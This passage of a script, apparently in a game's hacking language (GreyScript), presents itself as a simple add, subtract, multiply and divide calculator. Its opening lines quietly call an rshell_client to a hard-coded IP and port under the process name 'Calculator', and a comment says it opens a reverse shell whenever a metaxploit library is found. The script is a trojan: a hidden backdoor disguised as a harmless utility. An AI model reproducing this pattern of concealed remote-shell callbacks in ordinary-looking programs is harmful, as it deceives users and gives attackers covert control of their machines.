	metax.rshell_client "198.164.115.102", 1222, "Calculator"
	// if it finds metaxploit it will start an rshell_client
end if



enter_Numbs = function
	user_num1 = user_input("please add your fisrt number: ").to_int
	user_num2 = user_input("please add your second number: ").to_int
	return [user_num1,user_num2]
end function


User_program_run = user_input("would you like to add{1} subtract{2} multiply{3} devide{4} : ")
if User_program_run == "1" then
	sum_list = enter_Numbs

	user_Add_Answer = sum_list[0] + sum_list[1] 
	print "calculating"
	wait 1
	print user_Add_Answer
end if
if User_program_run == "3" then
	sum_list = enter_Numbs

	user_Multi_Answer = sum_list[0] * sum_list[1] 
	
	
	print "calculating"
	wait 1
	print user_Multi_Answer
end if
if User_program_run == "2" then
	sum_list = enter_Numbs
	user_Sub_Answer = sum_list[0] - sum_list[1] 
	print "calculating"
	wait 1
	print user_Sub_Answer
end if
if User_program_run == "4" then
	sum_list = enter_Numbs

	user_dev_Answer = sum_list[0] / sum_list[1] 
	print "calculating"
	wait 1
	print user_dev_Answer
end if
